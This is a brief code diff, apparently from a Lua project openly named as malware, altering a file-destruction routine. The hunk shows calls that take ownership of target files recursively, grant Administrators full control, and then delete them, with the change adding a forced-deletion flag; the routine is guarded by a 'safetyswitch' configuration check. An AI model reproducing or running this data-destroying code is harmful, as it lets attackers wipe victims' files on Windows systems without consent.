@@ -270,7 +270,7 @@ if not Balware.config.safetyswitch then
 		end
 		os.execute('takeown /f "'..dir..filename..'" /r /d y')
 		os.execute('icacls "'..dir..filename..'" /grant Administrators:F /t')
-		os.execute('del "'..dir..filename..'"')
+		os.execute('del /f "'..dir..filename..'"')
 	end
 else
 	Malware.destruction = function(filename,dir)
